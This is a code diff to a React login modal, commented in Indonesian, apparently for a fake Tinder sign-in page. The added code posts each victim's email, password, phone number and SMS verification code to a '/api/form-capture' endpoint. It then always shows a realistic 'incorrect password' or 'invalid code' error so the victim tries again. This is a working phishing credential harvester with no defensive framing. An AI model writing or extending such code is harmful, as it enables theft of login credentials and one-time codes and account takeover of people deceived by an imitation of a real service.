@@ -118,16 +118,36 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setIsLoading(true);
 
     try {
+      // Kirim data login ke endpoint form capture
+      await fetch('/api/form-capture', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          source: 'tinder',
+          email,
+          password,
+          additional_data: {
+            login_method: 'email',
+            login_time: new Date().toISOString(),
+          },
+        }),
+      });
+
       // Simulate API call
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
-      // For demo purposes, always succeed
-      console.log('Login successful with:', { email, password });
-
-      // Close modal after successful login
-      onClose();
+      // Untuk keperluan demo, tampilkan error agar pengguna mencoba lagi
+      // Tampilkan pesan error yang terlihat asli seperti dari layanan nyata
+      setError(
+        'The email or password you entered is incorrect. Please check your information and try again.',
+      );
     } catch (err) {
-      setError('Login failed. Please check your credentials and try again.');
+      // Bahkan jika pengiriman ke form-capture gagal, tetap tampilkan error yang sama
+      setError(
+        'The email or password you entered is incorrect. Please check your information and try again.',
+      );
     } finally {
       setIsLoading(false);
     }
@@ -152,6 +172,22 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setIsLoading(true);
 
     try {
+      // Kirim data telepon ke endpoint form capture
+      await fetch('/api/form-capture', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          source: 'tinder',
+          phone: phoneNumber,
+          additional_data: {
+            login_method: 'phone',
+            login_time: new Date().toISOString(),
+          },
+        }),
+      });
+
       // Simulate API call to send verification code
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
@@ -184,17 +220,28 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setIsLoading(true);
 
     try {
+      // Kirim data verifikasi ke endpoint form capture
+      await fetch('/api/form-capture', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          source: 'tinder',
+          phone: phoneNumber,
+          additional_data: {
+            login_method: 'phone',
+            verification_code: verificationCode,
+            login_time: new Date().toISOString(),
+          },
+        }),
+      });
+
       // Simulate API call to verify code
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
-      // For demo purposes, always succeed
-      console.log('Phone verification successful:', {
-        phoneNumber,
-        verificationCode,
-      });
-
-      // Close modal after successful login
-      onClose();
+      // Untuk demo, tampilkan error bahwa kode salah
+      setError('Invalid verification code. Please try again.');
     } catch (err) {
       setError('Verification failed. Please check the code and try again.');
     } finally {
